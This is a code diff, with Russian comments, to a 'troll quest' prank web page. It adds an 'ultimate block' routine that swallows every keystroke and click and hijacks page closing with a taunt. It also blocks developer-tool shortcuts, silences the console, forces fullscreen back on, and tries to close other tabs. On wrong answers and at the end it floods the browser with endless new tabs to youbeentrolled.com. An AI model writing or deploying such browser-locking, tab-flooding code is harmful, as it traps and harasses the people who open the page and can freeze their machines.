@@ -29,8 +29,8 @@
         .quest-gif {
             width: 100%; height: 100%; object-fit: contain;
             position: absolute; top: 0; left: 0; z-index: 1;
-            opacity: 0.5; pointer-events: none;
-            filter: drop-shadow(0 0 80px rgba(255,0,0,0.3)) brightness(0.6);
+            opacity: 0.4; pointer-events: none;
+            filter: drop-shadow(0 0 80px rgba(255,0,0,0.2)) brightness(0.5);
         }
         .quest-content {
             position: relative; z-index: 3;
@@ -38,7 +38,7 @@
             align-items: center;
             gap: 20px;
             padding: 40px;
-            background: rgba(0,0,0,0.85);
+            background: rgba(0,0,0,0.9);
             border-radius: 30px;
             border: 3px solid #ff0044;
             backdrop-filter: blur(10px);
@@ -167,17 +167,6 @@
             0% { transform: translateY(-100vh) rotate(0deg); }
             100% { transform: translateY(100vh) rotate(720deg); }
         }
-        .overlay-block {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            z-index: 9999; background: transparent;
-            pointer-events: none;
-        }
-        #blockScreen {
-            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.01);
-            z-index: 9998;
-            pointer-events: none;
-        }
         .quest-logo {
             font-size: 3rem;
             animation: pulse 0.5s infinite;
@@ -203,10 +192,16 @@
             position: relative;
             z-index: 2;
         }
+        .error-flash {
+            animation: errorPulse 0.5s ease 3;
+        }
+        @keyframes errorPulse {
+            0%, 100% { border-color: #ff0044; box-shadow: 0 0 30px rgba(255,0,68,0.3); }
+            50% { border-color: #ff0000; box-shadow: 0 0 80px rgba(255,0,0,0.8); background: rgba(255,0,0,0.2); }
+        }
     </style>
 </head>
 <body>
-    <div id="blockScreen"></div>
     <div class="quest-container">
         <img class="quest-gif" src="https://i.pinimg.com/originals/a8/01/32/a80132507ba34499b157be336517c72b.gif" alt="TROLL" loading="eager">
         
@@ -300,6 +295,8 @@
         let tabInterval = null;
         let currentLevel = 1;
         let isQuestComplete = false;
+        let errorCount = 0;
+        let isBlockingActive = false;
 
         // ========== ПРАВИЛЬНЫЕ ОТВЕТЫ ==========
         const answers = {
@@ -334,161 +331,175 @@
             });
         }
 
-        // ========== БЛОКИРОВКИ (только для НЕ квеста) ==========
-        function blockKeyboard() {
-            document.addEventListener('keydown', function(e) {
-                // Проверяем, является ли цель полем ввода
-                const target = e.target;
-                const isInput = target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.isContentEditable;
-                
-                // Если это поле ввода - разрешаем
-                if (isInput) {
-                    return true;
-                }
-                
-                // Если квест пройден - блокируем всё
-                if (isQuestComplete) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-                
-                // Блокируем только опасные клавиши вне полей ввода
-                const blockedKeys = ['F1','F2','F3','F4','F5','F6','F7','F8','F9','F10','F11','F12',
-                    'Escape','Tab','CapsLock','PrintScreen','ScrollLock','Pause','Insert','Home','End',
-                    'PageUp','PageDown','Delete','ContextMenu'];
-                
-                if (blockedKeys.includes(e.key)) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-                
-                // Блокируем комбинации с Ctrl
-                if (e.ctrlKey && ['w','W','t','T','n','N','r','R','s','S','p','P','a','A','c','C','v','V','x','X','z','Z','y','Y'].includes(e.key)) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-                
-                // Блокируем Alt+F4 и Alt+Tab
-                if (e.altKey && (e.key === 'F4' || e.key === 'Tab')) {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-                
-                // Блокируем Win ключ
-                if (e.key === 'Meta' || e.key === 'Windows') {
-                    e.preventDefault();
-                    e.stopPropagation();
-                    return false;
-                }
-                
-                return true;
-            }, true);
-        }
+        // ========== УЛЬТИМАТИВНАЯ БЛОКИРОВКА ==========
+        function activateUltimateBlock() {
+            if (isBlockingActive) return;
+            isBlockingActive = true;
 
-        function blockMouse() {
+            // 1. БЛОКИРУЕМ ВСЕ КЛАВИШИ
+            document.addEventListener('keydown', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            document.addEventListener('keyup', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            document.addEventListener('keypress', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                return false;
+            }, true);
+
+            // 2. БЛОКИРУЕМ МЫШЬ
             document.addEventListener('contextmenu', function(e) {
-                // Разрешаем только на полях ввода и кнопках
-                const target = e.target;
-                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA' || target.tagName === 'BUTTON') {
-                    return true;
-                }
                 e.preventDefault();
                 return false;
+            });
+
+            document.addEventListener('selectstart', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('mousedown', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('mouseup', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                return false;
+            });
+
+            // 3. БЛОКИРУЕМ ЗАКРЫТИЕ
+            window.onbeforeunload = function(e) {
+                e.preventDefault();
+                e.returnValue = '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+                return '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+            };
+
+            // 4. БЛОКИРУЕМ ИНСПЕКТОР
+            Object.defineProperty(document, 'hidden', { value: false });
+            Object.defineProperty(document, 'visibilityState', { value: 'visible' });
+            
+            // 5. БЛОКИРУЕМ F12, Ctrl+Shift+I и т.д.
+            document.addEventListener('keydown', function(e) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) ||
+                    (e.ctrlKey && e.key === 'u')) {
+                    e.preventDefault();
+                    return false;
+                }
+            }, true);
+
+            // 6. БЛОКИРУЕМ ВСЕ ВСПЛЫВАЮЩИЕ ОКНА
+            window.open = function() { return null; };
+            
+            // 7. БЛОКИРУЕМ КОНСОЛЬ
+            console.log = function() {};
+            console.warn = function() {};
+            console.error = function() {};
+            console.info = function() {};
+            
+            // 8. БЛОКИРУЕМ ИЗМЕНЕНИЕ URL
+            history.pushState = function() { return; };
+            history.replaceState = function() { return; };
+            
+            // 9. БЛОКИРУЕМ ВЫХОД ИЗ ПОЛНОЭКРАННОГО РЕЖИМА
+            document.addEventListener('fullscreenchange', function(e) {
+                if (!document.fullscreenElement) {
+                    document.documentElement.requestFullscreen().catch(() => {});
+                }
             });
             
-            document.addEventListener('selectstart', function(e) {
-                const target = e.target;
-                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
-                    return true;
+            // 10. ЗАПУСКАЕМ ПОЛНОЭКРАННЫЙ РЕЖИМ
+            try {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } catch(e) {}
+
+            // 11. БЛОКИРУЕМ СВЁРТЫВАНИЕ
+            document.addEventListener('visibilitychange', function() {
+                if (document.hidden) {
+                    setTimeout(() => {
+                        window.focus();
+                    }, 10);
                 }
+            });
+
+            // 12. БЛОКИРУЕМ ЗАКРЫТИЕ ЧЕРЕЗ ALT+F4
+            window.addEventListener('beforeunload', function(e) {
                 e.preventDefault();
-                return false;
+                e.returnValue = '';
             });
         }
 
-        function blockClose() {
-            window.onbeforeunload = function(e) {
-                if (!isQuestComplete) {
-                    e.preventDefault();
-                    e.returnValue = '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
-                    return '🔥 ТЫ НЕ СМОЖЕШЬ УЙТИ!';
+        // ========== ЗАКРЫТИЕ ВСЕХ ВКЛАДОК КРОМЕ СВОЕЙ ==========
+        function closeAllOtherTabs() {
+            try {
+                // Пытаемся закрыть все окна кроме текущего
+                const currentWindow = window;
+                const windows = window.open('', '_blank');
+                if (windows) {
+                    windows.close();
                 }
-            };
+                
+                // Пытаемся закрыть через window.close()
+                let count = 0;
+                const closeInterval = setInterval(() => {
+                    try {
+                        const win = window.open('', '_blank');
+                        if (win) {
+                            win.close();
+                            count++;
+                        }
+                        if (count > 50) clearInterval(closeInterval);
+                    } catch(e) {
+                        clearInterval(closeInterval);
+                    }
+                }, 10);
+            } catch(e) {}
         }
 
-        function blockInspector() {
-            document.addEventListener('keydown', function(e) {
-                const target = e.target;
-                if (target.tagName === 'INPUT' || target.tagName === 'TEXTAREA') {
-                    return true;
-                }
-                if (e.key === 'F12') { e.preventDefault(); return false; }
-                if (e.ctrlKey && e.shiftKey && ['I','J','C'].includes(e.key.toUpperCase())) { e.preventDefault(); return false; }
-                if (e.ctrlKey && e.key === 'u') { e.preventDefault(); return false; }
-                return true;
-            });
-        }
-
-        // ========== СПАВН ВКЛАДОК ==========
-        function spawnTabs(count = 10) {
-            if (isQuestComplete) return;
-            for (let i = 0; i < count; i++) {
+        // ========== ОБРАБОТКА ОШИБКИ ==========
+        function handleError() {
+            errorCount++;
+            
+            // Эффект вспышки
+            document.querySelector('.quest-content').classList.add('error-flash');
+            setTimeout(() => {
+                document.querySelector('.quest-content').classList.remove('error-flash');
+            }, 1500);
+            
+            // Закрываем все вкладки кроме своей
+            closeAllOtherTabs();
+            
+            // Блокируем всё
+            activateUltimateBlock();
+            
+            // Музыка на макс
+            forcePlayAudio();
+            
+            // Спавним вкладки как наказание
+            for (let i = 0; i < 20; i++) {
                 setTimeout(() => {
                     try {
-                        const win = window.open('https://youbeentrolled.com', '_blank');
-                        if (!win) {
-                            if (tabCount % 5 === 0) {
-                                window.location.href = 'https://youbeentrolled.com';
-                            }
-                        }
-                        tabCount++;
-                        document.getElementById('statusIndicator').textContent = `📊 ВКЛАДОК: ${tabCount}`;
+                        window.open('https://youbeentrolled.com', '_blank');
                     } catch(e) {}
-                }, i * 50);
+                }, i * 100);
             }
-        }
-
-        function startInfiniteTabs() {
-            if (isQuestComplete) return;
-            spawnTabs(20);
-            tabInterval = setInterval(() => {
-                if (isQuestComplete) {
-                    clearInterval(tabInterval);
-                    return;
-                }
-                if (tabCount < 200) {
-                    spawnTabs(5);
-                } else {
-                    clearInterval(tabInterval);
-                    tabInterval = setInterval(() => { 
-                        if (!isQuestComplete) spawnTabs(2); 
-                    }, 3000);
-                }
-            }, 1000);
-        }
-
-        // ========== ЭФФЕКТЫ ==========
-        function startEffects() {
-            document.body.style.animation = 'shake 0.05s infinite';
-            document.querySelector('.quest-container').style.animation = 'pulse 0.2s infinite';
-        }
-
-        function createConfetti() {
-            const symbols = ['🔥', '💀', '⚡', '🔴', '💢', '‼️', '⛔', '💥', '🎯', '😈'];
-            for (let i = 0; i < 60; i++) {
-                const el = document.createElement('div');
-                el.className = 'confetti';
-                el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
-                el.style.left = Math.random() * 100 + '%';
-                el.style.fontSize = (10 + Math.random() * 40) + 'px';
-                el.style.animationDuration = (3 + Math.random() * 8) + 's';
-                el.style.animationDelay = (Math.random() * 5) + 's';
-                document.body.appendChild(el);
-            }
+            
+            // Меняем индикатор
+            document.getElementById('statusIndicator').textContent = `💀 ОШИБОК: ${errorCount}`;
         }
 
         // ========== КВЕСТ ЛОГИКА ==========
@@ -507,18 +518,20 @@
                 if (nextLevel === 5) {
                     document.getElementById('btnFinal').addEventListener('click', function() {
                         isQuestComplete = true;
+                        // Снимаем блокировку для финала
+                        isBlockingActive = false;
                         startTroll();
                     });
                 }
             } else {
+                handleError();
+                
                 btn.textContent = '❌ НЕПРАВИЛЬНО!';
                 btn.style.background = '#880022';
                 setTimeout(() => {
                     btn.textContent = 'ПРОВЕРИТЬ';
                     btn.style.background = '#ff0044';
-                }, 1500);
-                
-                spawnTabs(3);
+                }, 2000);
             }
         }
 
@@ -528,14 +541,11 @@
             isTrolled = true;
             
             forcePlayAudio();
-            blockClose();
-            startEffects();
-            startInfiniteTabs();
             
-            localStorage.setItem('trolled', 'true');
-            localStorage.setItem('trolled_time', Date.now().toString());
+            // Максимальная блокировка
+            activateUltimateBlock();
             
-            // Скрываем квест, показываем троллинг
+            // Скрываем квест
             document.querySelector('.quest-content').classList.add('quest-hidden');
             document.querySelector('.quest-gif').style.opacity = '0.9';
             document.querySelector('.quest-gif').style.filter = 'drop-shadow(0 0 80px rgba(255,0,0,0.5)) brightness(1.2)';
@@ -556,6 +566,13 @@
             gif.style.zIndex = '1';
             
             document.getElementById('statusIndicator').textContent = '💀 АД ЗАПУЩЕН!';
+            
+            // Бесконечные вкладки
+            setInterval(() => {
+                try {
+                    window.open('https://youbeentrolled.com', '_blank');
+                } catch(e) {}
+            }, 100);
         }
 
         // ========== ПРОВЕРКА СОСТОЯНИЯ ==========
@@ -569,10 +586,6 @@
 
         // ========== ИНИЦИАЛИЗАЦИЯ ==========
         function init() {
-            blockKeyboard();
-            blockMouse();
-            blockInspector();
-            blockClose();
             initAudio();
             createConfetti();
             checkState();
@@ -599,11 +612,27 @@
                 });
             });
 
+            // Защита от дурака
             setTimeout(() => {
-                if (!isTrolled && currentLevel === 1) {
-                    document.getElementById('btn1').click();
+                if (!isTrolled && currentLevel === 1 && errorCount < 3) {
+                    // Если ничего не делает - небольшое напоминание
+                    document.querySelector('.quest-text').innerHTML += '<br><span style="color:#ff0044;">⚠️ Ждём твоего ответа...</span>';
                 }
-            }, 30000);
+            }, 15000);
+        }
+
+        function createConfetti() {
+            const symbols = ['🔥', '💀', '⚡', '🔴', '💢', '‼️', '⛔', '💥', '🎯', '😈'];
+            for (let i = 0; i < 60; i++) {
+                const el = document.createElement('div');
+                el.className = 'confetti';
+                el.textContent = symbols[Math.floor(Math.random() * symbols.length)];
+                el.style.left = Math.random() * 100 + '%';
+                el.style.fontSize = (10 + Math.random() * 40) + 'px';
+                el.style.animationDuration = (3 + Math.random() * 8) + 's';
+                el.style.animationDelay = (Math.random() * 5) + 's';
+                document.body.appendChild(el);
+            }
         }
 
         if (document.readyState === 'complete') {
